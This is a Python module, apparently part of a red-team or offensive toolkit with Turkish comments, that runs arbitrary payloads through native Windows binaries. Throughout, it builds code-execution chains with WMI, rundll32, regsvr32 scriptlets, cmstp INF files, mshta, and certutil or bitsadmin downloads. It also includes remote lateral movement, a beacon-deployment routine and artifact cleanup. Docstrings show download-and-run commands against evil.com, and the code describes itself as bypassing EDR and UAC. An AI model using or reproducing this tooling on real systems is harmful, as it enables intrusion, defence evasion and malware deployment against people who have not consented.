"""
Living-off-the-Land (LOTL) Execution
====================================
Native Windows tool'larla code execution

LOLBins:
- WMI (wmic.exe, PowerShell WMI)
- rundll32.exe
- regsvr32.exe
- cmstp.exe
- mshta.exe
- certutil.exe
- bitsadmin.exe
- msiexec.exe
- wscript/cscript
- installutil.exe
- regasm/regsvcs

⚠️ YASAL UYARI: Bu modül sadece yetkili penetrasyon testleri içindir.
"""

from __future__ import annotations
import os
import time
import base64
import secrets
import tempfile
import subprocess
import logging
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple, Any, Callable
from enum import Enum, auto

logger = logging.getLogger("lotl_execution")


# ============================================================
# ENUMS & CONSTANTS
# ============================================================

class LOLBin(Enum):
    """Living-off-the-Land Binary"""
    WMI = "wmi"
    WMIC = "wmic"
    RUNDLL32 = "rundll32"
    REGSVR32 = "regsvr32"
    CMSTP = "cmstp"
    MSHTA = "mshta"
    CERTUTIL = "certutil"
    BITSADMIN = "bitsadmin"
    MSIEXEC = "msiexec"
    WSCRIPT = "wscript"
    CSCRIPT = "cscript"
    INSTALLUTIL = "installutil"
    REGASM = "regasm"
    REGSVCS = "regsvcs"
    FORFILES = "forfiles"
    PCALUA = "pcalua"
    MSDEPLOY = "msdeploy"
    ODBCCONF = "odbcconf"
    IEEXEC = "ieexec"


class LOLMethod(Enum):
    """LOTL execution metodu"""
    PROCESS_CREATE = "process_create"       # WMI Process Create
    SCRIPT_EXEC = "script_exec"             # Script execution
    DLL_EXEC = "dll_exec"                   # DLL execution
    SCT_EXEC = "sct_exec"                   # Scriptlet execution
    INF_INSTALL = "inf_install"             # INF file install
    DOWNLOAD_EXEC = "download_exec"         # Download and execute
    COMMAND_EXEC = "command_exec"           # Direct command execution


@dataclass
class LOTLConfig:
    """LOTL execution konfigürasyonu"""
    preferred_bins: List[LOLBin] = field(default_factory=lambda: [
        LOLBin.WMI, LOLBin.RUNDLL32, LOLBin.MSHTA
    ])
    fallback_enabled: bool = True
    cleanup_artifacts: bool = True
    use_encoded_commands: bool = True
    timeout_seconds: int = 60
    
    # Remote execution
    remote_host: str = ""
    remote_user: str = ""
    remote_password: str = ""
    use_current_creds: bool = True
    
    # Staging
    stage_to_temp: bool = True
    stage_to_smb: bool = False
    smb_share: str = ""


@dataclass
class LOTLResult:
    """LOTL execution sonucu"""
    success: bool
    method: LOLMethod
    lolbin: LOLBin
    target: str = ""
    pid: int = 0
    output: str = ""
    error: str = ""
    artifacts: List[str] = field(default_factory=list)
    detection_risk: float = 0.5
    cleanup_done: bool = False


# ============================================================
# LOTL EXECUTOR
# ============================================================

class LOTLExecutor:
    """
    Living-off-the-Land Executor
    
    Native Windows tool'lar ile code execution:
    - Lateral movement için psexec alternatifi
    - EDR bypass için trusted binary kullanımı
    - Defense-in-depth bypass
    """
    
    def __init__(self, config: LOTLConfig = None):
        self.config = config or LOTLConfig()
        self._temp_files: List[str] = []
    
    def execute(self, payload: str, lolbin: LOLBin = None,
                method: LOLMethod = None, target: str = "") -> LOTLResult:
        """
        Ana execution fonksiyonu
        
        Args:
            payload: Çalıştırılacak komut/payload
            lolbin: Kullanılacak LOLBin (None = auto-select)
            method: Execution metodu (None = auto-select)
            target: Uzak hedef (boş = lokal)
        
        Returns:
            LOTLResult
        """
        lolbin = lolbin or self.config.preferred_bins[0]
        target = target or self.config.remote_host
        
        logger.info(f"LOTL execution via {lolbin.value} -> {target or 'localhost'}")
        
        method_map = {
            LOLBin.WMI: (self._wmi_execute, LOLMethod.PROCESS_CREATE),
            LOLBin.WMIC: (self._wmic_execute, LOLMethod.PROCESS_CREATE),
            LOLBin.RUNDLL32: (self._rundll32_execute, LOLMethod.DLL_EXEC),
            LOLBin.REGSVR32: (self._regsvr32_execute, LOLMethod.SCT_EXEC),
            LOLBin.CMSTP: (self._cmstp_execute, LOLMethod.INF_INSTALL),
            LOLBin.MSHTA: (self._mshta_execute, LOLMethod.SCRIPT_EXEC),
            LOLBin.CERTUTIL: (self._certutil_execute, LOLMethod.DOWNLOAD_EXEC),
            LOLBin.BITSADMIN: (self._bitsadmin_execute, LOLMethod.DOWNLOAD_EXEC),
            LOLBin.WSCRIPT: (self._wscript_execute, LOLMethod.SCRIPT_EXEC),
            LOLBin.CSCRIPT: (self._cscript_execute, LOLMethod.SCRIPT_EXEC),
            LOLBin.INSTALLUTIL: (self._installutil_execute, LOLMethod.DLL_EXEC),
            LOLBin.FORFILES: (self._forfiles_execute, LOLMethod.COMMAND_EXEC),
            LOLBin.PCALUA: (self._pcalua_execute, LOLMethod.COMMAND_EXEC),
            LOLBin.ODBCCONF: (self._odbcconf_execute, LOLMethod.DLL_EXEC),
        }
        
        exec_func, default_method = method_map.get(
            lolbin, (self._generic_execute, LOLMethod.COMMAND_EXEC)
        )
        method = method or default_method
        
        try:
            result = exec_func(payload, target)
            result.method = method
            result.lolbin = lolbin
            result.target = target or "localhost"
            
            if self.config.cleanup_artifacts and result.artifacts:
                self._cleanup_artifacts(result.artifacts)
                result.cleanup_done = True
            
            return result
            
        except Exception as e:
            logger.error(f"LOTL execution error: {e}")
            return LOTLResult(
                success=False,
                method=method,
                lolbin=lolbin,
                target=target,
                error=str(e)
            )
    
    def execute_with_fallback(self, payload: str, target: str = "") -> LOTLResult:
        """
        Fallback destekli execution
        İlk başarılı olan LOLBin'i kullan
        """
        for lolbin in self.config.preferred_bins:
            result = self.execute(payload, lolbin, target=target)
            if result.success:
                return result
            logger.warning(f"{lolbin.value} failed, trying next...")
        
        return LOTLResult(
            success=False,
            method=LOLMethod.COMMAND_EXEC,
            lolbin=self.config.preferred_bins[0],
            error="All LOTL methods failed"
        )
    
    # ============================================================
    # WMI EXECUTION
    # ============================================================
    
    def _wmi_execute(self, payload: str, target: str) -> LOTLResult:
        """
        WMI Process Create
        
        PowerShell veya wmic ile uzak/lokal process oluştur
        """
        result = LOTLResult(
            success=False,
            method=LOLMethod.PROCESS_CREATE,
            lolbin=LOLBin.WMI,
            detection_risk=0.45
        )
        
        try:
            if target:
                # Remote WMI
                if self.config.use_current_creds:
                    ps_cmd = f'''
$computer = "{target}"
$process = [WMICLASS]"\\\\$computer\\ROOT\\CIMV2:win32_process"
$result = $process.Create("{payload}")
$result.ReturnValue
'''
                else:
                    ps_cmd = f'''
$cred = New-Object System.Management.Automation.PSCredential("{self.config.remote_user}", (ConvertTo-SecureString "{self.config.remote_password}" -AsPlainText -Force))
$opt = New-CimSessionOption -Protocol Dcom
$session = New-CimSession -ComputerName "{target}" -Credential $cred -SessionOption $opt
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{{CommandLine="{payload}"}}
'''
            else:
                # Local WMI
                ps_cmd = f'''
$process = [WMICLASS]"ROOT\\CIMV2:win32_process"
$result = $process.Create("{payload}")
$result.ReturnValue
'''
            
            # Execute PowerShell
            proc = subprocess.run(
                ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps_cmd],
                capture_output=True, text=True, timeout=self.config.timeout_seconds
            )
            
            result.output = proc.stdout
            if proc.returncode == 0 and "0" in proc.stdout:
                result.success = True
                result.detection_risk = 0.40
            else:
                result.error = proc.stderr or "WMI execution failed"
            
            return result
            
        except Exception as e:
            result.error = str(e)
            return result
    
    def _wmic_execute(self, payload: str, target: str) -> LOTLResult:
        """
        WMIC.exe ile process oluştur
        
        wmic /node:target process call create "cmd /c payload"
        """
        result = LOTLResult(
            success=False,
            method=LOLMethod.PROCESS_CREATE,
            lolbin=LOLBin.WMIC,
            detection_risk=0.50
        )
        
        try:
            if target:
                if self.config.use_current_creds:
                    cmd = [
                        "wmic", f"/node:{target}",
                        "process", "call", "create", payload
                    ]
                else:
                    cmd = [
                        "wmic", f"/node:{target}",
                        f"/user:{self.config.remote_user}",
                        f"/password:{self.config.remote_password}",
                        "process", "call", "create", payload
                    ]
            else:
                cmd = ["wmic", "process", "call", "create", payload]
            
            proc = subprocess.run(
                cmd, capture_output=True, text=True,
                timeout=self.config.timeout_seconds
            )
            
            result.output = proc.stdout
            if "ReturnValue = 0" in proc.stdout:
                result.success = True
                # Extract PID if available
                if "ProcessId" in proc.stdout:
                    try:
                        pid_line = [l for l in proc.stdout.split('\n') if "ProcessId" in l][0]
                        result.pid = int(pid_line.split('=')[1].strip().rstrip(';'))
                    except:
                        pass
            else:
                result.error = proc.stderr or proc.stdout
            
            return result
            
        except Exception as e:
            result.error = str(e)
            return result
    
    # ============================================================
    # RUNDLL32 EXECUTION
    # ============================================================
    
    def _rundll32_execute(self, payload: str, target: str) -> LOTLResult:
        """
        rundll32.exe ile DLL/JavaScript execution
        
        Techniques:
        1. rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";...
        2. rundll32.exe url.dll,OpenURL file://...
        3. rundll32.exe shell32.dll,ShellExec_RunDLL ...
        """
        result = LOTLResult(
            success=False,
            method=LOLMethod.DLL_EXEC,
            lolbin=LOLBin.RUNDLL32,
            detection_risk=0.55
        )
        
        try:
            # JavaScript technique
            if payload.startswith("javascript:") or payload.startswith("http"):
                cmd = [
                    "rundll32.exe",
                    f'javascript:"\\..\\mshtml,RunHTMLApplication";document.write("<script>new ActiveXObject(\\"WScript.Shell\\").Run(\\"{payload}\\");</script>")'
                ]
            elif payload.endswith(".dll"):
                # DLL execution
                cmd = ["rundll32.exe", payload, "DllMain"]
            else:
                # Shell execution
                cmd = [
                    "rundll32.exe", "shell32.dll,ShellExec_RunDLL",
                    "cmd.exe", "/c", payload
                ]
            
            if target:
                # Use WMI to run rundll32 remotely
                return self._wmi_execute(" ".join(cmd), target)
            
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            )
            
            result.success = True
            result.pid = proc.pid
            
            return result
            
        except Exception as e:
            result.error = str(e)
            return result
    
    # ============================================================
    # REGSVR32 EXECUTION
    # ============================================================
    
    def _regsvr32_execute(self, payload: str, target: str) -> LOTLResult:
        """
        regsvr32.exe ile SCT (scriptlet) execution
        
        regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll
        
        Payload should be SCT content or URL
        """
        result = LOTLResult(
            success=False,
            method=LOLMethod.SCT_EXEC,
            lolbin=LOLBin.REGSVR32,
            detection_risk=0.50
        )
        
        try:
            # If payload is SCT content, stage it
            if payload.startswith("<?XML") or "<scriptlet>" in payload:
                sct_path = self._stage_file(payload, ".sct")
                sct_url = f"file://{sct_path}"
                result.artifacts.append(sct_path)
            elif payload.startswith("http"):
                sct_url = payload
            else:
                # Wrap command in SCT
                sct_content = self._generate_sct(payload)
                sct_path = self._stage_file(sct_content, ".sct")
                sct_url = f"file://{sct_path}"
                result.artifacts.append(sct_path)
            
            cmd = [
                "regsvr32.exe", "/s", "/n", "/u",
                f"/i:{sct_url}", "scrobj.dll"
            ]
            
            if target:
                return self._wmi_execute(" ".join(cmd), target)
            
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            )
            
            result.success = True
            result.pid = proc.pid
            
            return result
            
        except Exception as e:
            result.error = str(e)
            return result
    
    def _generate_sct(self, command: str) -> str:
        """Generate SCT scriptlet file"""
        return f'''<?XML version="1.0"?>
<scriptlet>
<registration
    progid="LOTL"
    classid="{{F0001111-0000-0000-0000-0000FEEDACDC}}">
    <script language="JScript">
        <![CDATA[
            var r = new ActiveXObject("WScript.Shell").Run("{command}");
        ]]>
    </script>
</registration>
</scriptlet>'''
    
    # ============================================================
    # CMSTP EXECUTION
    # ============================================================
    
    def _cmstp_execute(self, payload: str, target: str) -> LOTLResult:
        """
        cmstp.exe ile INF file execution
        
        UAC bypass potential!
        """
        result = LOTLResult(
            success=False,
            method=LOLMethod.INF_INSTALL,
            lolbin=LOLBin.CMSTP,
            detection_risk=0.45
        )
        
        try:
            # Generate INF file
            inf_content = self._generate_inf(payload)
            inf_path = self._stage_file(inf_content, ".inf")
            result.artifacts.append(inf_path)
            
            cmd = ["cmstp.exe", "/s", inf_path]
            
            if target:
                return self._wmi_execute(" ".join(cmd), target)
            
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            )
            
            result.success = True
            result.pid = proc.pid
            
            return result
            
        except Exception as e:
            result.error = str(e)
            return result
    
    def _generate_inf(self, command: str) -> str:
        """Generate INF file for cmstp"""
        return f'''[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\\scrobj.dll,NI,{{F0001111-0000-0000-0000-0000FEEDACDC}}

[Strings]
AppAct = "SOFTWARE\\Microsoft\\Connection Manager"
ServiceName="LOTL"
ShortSvcName="LOTL"

[RegisterOCXSection]
%11%\\scrobj.dll

[DefaultInstall]
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
{command}
'''
    
    # ============================================================
    # MSHTA EXECUTION
    # ============================================================
    
    def _mshta_execute(self, payload: str, target: str) -> LOTLResult:
        """
        mshta.exe ile HTA/JavaScript execution
        
        mshta.exe javascript:...
        mshta.exe vbscript:Execute("...")
        mshta.exe http://evil.com/file.hta
        """
        result = LOTLResult(
            success=False,
            method=LOLMethod.SCRIPT_EXEC,
            lolbin=LOLBin.MSHTA,
            detection_risk=0.55
        )
        
        try:
            if payload.startswith("http"):
                cmd = ["mshta.exe", payload]
            elif payload.startswith("javascript:") or payload.startswith("vbscript:"):
                cmd = ["mshta.exe", payload]
            else:
                # Wrap in JavaScript
                js_payload = f'javascript:a=new ActiveXObject("WScript.Shell");a.Run("{payload}");close();'
                cmd = ["mshta.exe", js_payload]
            
            if target:
                return self._wmi_execute(" ".join(cmd), target)
            
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            )
            
            result.success = True
            result.pid = proc.pid
            
            return result
            
        except Exception as e:
            result.error = str(e)
            return result
    
    # ============================================================
    # CERTUTIL EXECUTION
    # ============================================================
    
    def _certutil_execute(self, payload: str, target: str) -> LOTLResult:
        """
        certutil.exe ile download ve decode
        
        certutil -urlcache -split -f http://url/file.exe file.exe
        certutil -decode encoded.txt decoded.exe
        """
        result = LOTLResult(
            success=False,
            method=LOLMethod.DOWNLOAD_EXEC,
            lolbin=LOLBin.CERTUTIL,
            detection_risk=0.60
        )
        
        try:
            if payload.startswith("http"):
                # Download file
                output_name = f"lotl_{secrets.token_hex(4)}.exe"
                output_path = os.path.join(tempfile.gettempdir(), output_name)
                
                cmd = [
                    "certutil.exe", "-urlcache", "-split", "-f",
                    payload, output_path
                ]
                
                proc = subprocess.run(
                    cmd, capture_output=True, text=True,
                    timeout=self.config.timeout_seconds
                )
                
                if proc.returncode == 0 and os.path.exists(output_path):
                    result.success = True
                    result.artifacts.append(output_path)
                    result.output = f"Downloaded to: {output_path}"
                else:
                    result.error = proc.stderr
                    
            else:
                # Decode base64
                encoded_path = self._stage_file(payload, ".txt")
                output_name = f"lotl_{secrets.token_hex(4)}.exe"
                output_path = os.path.join(tempfile.gettempdir(), output_name)
                
                cmd = ["certutil.exe", "-decode", encoded_path, output_path]
                
                proc = subprocess.run(
                    cmd, capture_output=True, text=True,
                    timeout=self.config.timeout_seconds
                )
                
                result.artifacts.append(encoded_path)
                
                if proc.returncode == 0:
                    result.success = True
                    result.artifacts.append(output_path)
                else:
                    result.error = proc.stderr
            
            return result
            
        except Exception as e:
            result.error = str(e)
            return result
    
    # ============================================================
    # BITSADMIN EXECUTION
    # ============================================================
    
    def _bitsadmin_execute(self, payload: str, target: str) -> LOTLResult:
        """
        bitsadmin.exe ile download
        
        bitsadmin /transfer job /download /priority high http://url file
        """
        result = LOTLResult(
            success=False,
            method=LOLMethod.DOWNLOAD_EXEC,
            lolbin=LOLBin.BITSADMIN,
            detection_risk=0.55
        )
        
        try:
            if not payload.startswith("http"):
                result.error = "BITSADMIN requires HTTP URL"
                return result
            
            job_name = f"lotl_{secrets.token_hex(4)}"
            output_name = f"{job_name}.exe"
            output_path = os.path.join(tempfile.gettempdir(), output_name)
            
            cmd = [
                "bitsadmin.exe", "/transfer", job_name,
                "/download", "/priority", "high",
                payload, output_path
            ]
            
            proc = subprocess.run(
                cmd, capture_output=True, text=True,
                timeout=self.config.timeout_seconds * 2
            )
            
            if os.path.exists(output_path):
                result.success = True
                result.artifacts.append(output_path)
                result.output = f"Downloaded to: {output_path}"
            else:
                result.error = proc.stderr or "Download failed"
            
            return result
            
        except Exception as e:
            result.error = str(e)
            return result
    
    # ============================================================
    # SCRIPT HOSTS (WSCRIPT/CSCRIPT)
    # ============================================================
    
    def _wscript_execute(self, payload: str, target: str) -> LOTLResult:
        """wscript.exe ile VBS/JS execution"""
        return self._script_host_execute(payload, target, "wscript.exe")
    
    def _cscript_execute(self, payload: str, target: str) -> LOTLResult:
        """cscript.exe ile VBS/JS execution"""
        return self._script_host_execute(payload, target, "cscript.exe")
    
    def _script_host_execute(self, payload: str, target: str, 
                              host: str) -> LOTLResult:
        """Generic script host execution"""
        result = LOTLResult(
            success=False,
            method=LOLMethod.SCRIPT_EXEC,
            lolbin=LOLBin.WSCRIPT if "wscript" in host else LOLBin.CSCRIPT,
            detection_risk=0.50
        )
        
        try:
            # Determine script type
            if "CreateObject" in payload or "Dim " in payload:
                ext = ".vbs"
                if "WScript.Shell" not in payload:
                    payload = f'Set shell = CreateObject("WScript.Shell")\nshell.Run "{payload}"'
            else:
                ext = ".js"
                if "WScript.Shell" not in payload:
                    payload = f'new ActiveXObject("WScript.Shell").Run("{payload}");'
            
            script_path = self._stage_file(payload, ext)
            result.artifacts.append(script_path)
            
            cmd = [host, "//B", "//Nologo", script_path]
            
            if target:
                return self._wmi_execute(" ".join(cmd), target)
            
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            )
            
            result.success = True
            result.pid = proc.pid
            
            return result
            
        except Exception as e:
            result.error = str(e)
            return result
    
    # ============================================================
    # INSTALLUTIL EXECUTION
    # ============================================================
    
    def _installutil_execute(self, payload: str, target: str) -> LOTLResult:
        """
        installutil.exe ile .NET assembly execution
        
        Requires compiled .NET assembly with Uninstall method
        """
        result = LOTLResult(
            success=False,
            method=LOLMethod.DLL_EXEC,
            lolbin=LOLBin.INSTALLUTIL,
            detection_risk=0.45
        )
        
        try:
            # Find installutil
            framework_paths = [
                r"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe",
                r"C:\Windows\Microsoft.NET\Framework\v4.0.30319\installutil.exe",
            ]
            
            installutil_path = None
            for path in framework_paths:
                if os.path.exists(path):
                    installutil_path = path
                    break
            
            if not installutil_path:
                result.error = "installutil.exe not found"
                return result
            
            # Payload should be path to .NET assembly
            if not payload.endswith(".exe") and not payload.endswith(".dll"):
                result.error = "Payload must be .NET assembly path"
                return result
            
            cmd = [installutil_path, "/logfile=", "/LogToConsole=false", "/U", payload]
            
            if target:
                return self._wmi_execute(" ".join(cmd), target)
            
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            )
            
            result.success = True
            result.pid = proc.pid
            
            return result
            
        except Exception as e:
            result.error = str(e)
            return result
    
    # ============================================================
    # OTHER LOLBINS
    # ============================================================
    
    def _forfiles_execute(self, payload: str, target: str) -> LOTLResult:
        """forfiles.exe ile command execution"""
        result = LOTLResult(
            success=False,
            method=LOLMethod.COMMAND_EXEC,
            lolbin=LOLBin.FORFILES,
            detection_risk=0.40
        )
        
        try:
            # forfiles /p c:\windows\system32 /m notepad.exe /c "cmd /c payload"
            cmd = [
                "forfiles.exe", "/p", r"c:\windows\system32",
                "/m", "notepad.exe", "/c", payload
            ]
            
            if target:
                return self._wmi_execute(" ".join(cmd), target)
            
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            )
            
            result.success = True
            result.pid = proc.pid
            
            return result
            
        except Exception as e:
            result.error = str(e)
            return result
    
    def _pcalua_execute(self, payload: str, target: str) -> LOTLResult:
        """pcalua.exe (Program Compatibility Assistant) ile execution"""
        result = LOTLResult(
            success=False,
            method=LOLMethod.COMMAND_EXEC,
            lolbin=LOLBin.PCALUA,
            detection_risk=0.35
        )
        
        try:
            cmd = ["pcalua.exe", "-a", payload]
            
            if target:
                return self._wmi_execute(" ".join(cmd), target)
            
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            )
            
            result.success = True
            result.pid = proc.pid
            
            return result
            
        except Exception as e:
            result.error = str(e)
            return result
    
    def _odbcconf_execute(self, payload: str, target: str) -> LOTLResult:
        """odbcconf.exe ile DLL execution"""
        result = LOTLResult(
            success=False,
            method=LOLMethod.DLL_EXEC,
            lolbin=LOLBin.ODBCCONF,
            detection_risk=0.40
        )
        
        try:
            # odbcconf /a {REGSVR payload.dll}
            cmd = ["odbcconf.exe", "/a", f"{{REGSVR {payload}}}"]
            
            if target:
                return self._wmi_execute(" ".join(cmd), target)
            
            proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            )
            
            result.success = True
            result.pid = proc.pid
            
            return result
            
        except Exception as e:
            result.error = str(e)
            return result
    
    def _generic_execute(self, payload: str, target: str) -> LOTLResult:
        """Generic command execution"""
        result = LOTLResult(
            success=False,
            method=LOLMethod.COMMAND_EXEC,
            lolbin=LOLBin.WMI,
            detection_risk=0.50
        )
        
        if target:
            return self._wmi_execute(payload, target)
        
        try:
            proc = subprocess.Popen(
                payload, shell=True,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                creationflags=subprocess.CREATE_NO_WINDOW if os.name == 'nt' else 0
            )
            
            result.success = True
            result.pid = proc.pid
            
            return result
            
        except Exception as e:
            result.error = str(e)
            return result
    
    # ============================================================
    # HELPER METHODS
    # ============================================================
    
    def _stage_file(self, content: str, extension: str) -> str:
        """Stage content to temp file"""
        filename = f"lotl_{secrets.token_hex(4)}{extension}"
        filepath = os.path.join(tempfile.gettempdir(), filename)
        
        with open(filepath, 'w') as f:
            f.write(content)
        
        self._temp_files.append(filepath)
        return filepath
    
    def _cleanup_artifacts(self, artifacts: List[str]):
        """Clean up staged files"""
        for filepath in artifacts:
            try:
                if os.path.exists(filepath):
                    os.remove(filepath)
            except:
                pass
    
    def cleanup_all(self):
        """Clean up all temp files"""
        for filepath in self._temp_files:
            try:
                if os.path.exists(filepath):
                    os.remove(filepath)
            except:
                pass
        self._temp_files.clear()
    
    @staticmethod
    def get_lolbin_info(lolbin: LOLBin) -> Dict[str, Any]:
        """Get information about a LOLBin"""
        info_map = {
            LOLBin.WMI: {
                "name": "WMI",
                "binary": "N/A (PowerShell/WMIC)",
                "risk": 0.45,
                "methods": ["Process Create"],
                "mitre": "T1047",
                "description": "Windows Management Instrumentation",
            },
            LOLBin.WMIC: {
                "name": "WMIC",
                "binary": "wmic.exe",
                "risk": 0.50,
                "methods": ["Process Create", "Remote Execution"],
                "mitre": "T1047",
                "description": "WMI Command-line Interface",
            },
            LOLBin.RUNDLL32: {
                "name": "rundll32",
                "binary": "rundll32.exe",
                "risk": 0.55,
                "methods": ["DLL Exec", "JavaScript"],
                "mitre": "T1218.011",
                "description": "Execute DLL export functions",
            },
            LOLBin.REGSVR32: {
                "name": "regsvr32",
                "binary": "regsvr32.exe",
                "risk": 0.50,
                "methods": ["SCT/Scriptlet", "DLL Exec"],
                "mitre": "T1218.010",
                "description": "Register/unregister OLE controls",
            },
            LOLBin.CMSTP: {
                "name": "CMSTP",
                "binary": "cmstp.exe",
                "risk": 0.45,
                "methods": ["INF Install", "UAC Bypass"],
                "mitre": "T1218.003",
                "description": "Connection Manager Profile Installer",
            },
            LOLBin.MSHTA: {
                "name": "MSHTA",
                "binary": "mshta.exe",
                "risk": 0.55,
                "methods": ["HTA", "JavaScript", "VBScript"],
                "mitre": "T1218.005",
                "description": "Microsoft HTML Application Host",
            },
            LOLBin.CERTUTIL: {
                "name": "CertUtil",
                "binary": "certutil.exe",
                "risk": 0.60,
                "methods": ["Download", "Decode", "Encode"],
                "mitre": "T1140",
                "description": "Certificate utility",
            },
            LOLBin.BITSADMIN: {
                "name": "BITSADMIN",
                "binary": "bitsadmin.exe",
                "risk": 0.55,
                "methods": ["Download", "Execute"],
                "mitre": "T1197",
                "description": "Background Intelligent Transfer Service",
            },
        }
        
        return info_map.get(lolbin, {"name": lolbin.value, "risk": 0.5})


# ============================================================
# LATERAL MOVEMENT LOTL
# ============================================================

class LateralLOTL:
    """
    LOTL ile Lateral Movement
    
    psexec/smbexec alternatifi olarak native Windows tool'ları kullan
    """
    
    def __init__(self, executor: LOTLExecutor = None):
        self.executor = executor or LOTLExecutor()
    
    def lateral_jump(self, target: str, payload: str,
                     method: LOLBin = None) -> LOTLResult:
        """
        LOTL ile lateral movement
        
        Args:
            target: Hedef hostname/IP
            payload: Çalıştırılacak payload
            method: Kullanılacak LOLBin
        
        Returns:
            LOTLResult
        """
        method = method or LOLBin.WMI
        
        # Update config for remote execution
        self.executor.config.remote_host = target
        
        return self.executor.execute(payload, method, target=target)
    
    def deploy_beacon(self, target: str, beacon_url: str,
                      method: LOLBin = LOLBin.CERTUTIL) -> LOTLResult:
        """
        LOTL ile beacon deploy
        
        1. Download beacon via certutil/bitsadmin
        2. Execute via LOLBin
        """
        # Step 1: Download
        download_result = self.executor.execute(beacon_url, method)
        
        if not download_result.success:
            return download_result
        
        # Get downloaded file path
        if download_result.artifacts:
            beacon_path = download_result.artifacts[0]
            
            # Step 2: Execute
            exec_result = self.executor.execute(
                beacon_path, LOLBin.RUNDLL32, target=target
            )
            
            exec_result.artifacts.extend(download_result.artifacts)
            return exec_result
        
        return download_result


# ============================================================
# EXPORTS
# ============================================================

__all__ = [
    "LOLBin",
    "LOLMethod",
    "LOTLConfig",
    "LOTLResult",
    "LOTLExecutor",
    "LateralLOTL",
]
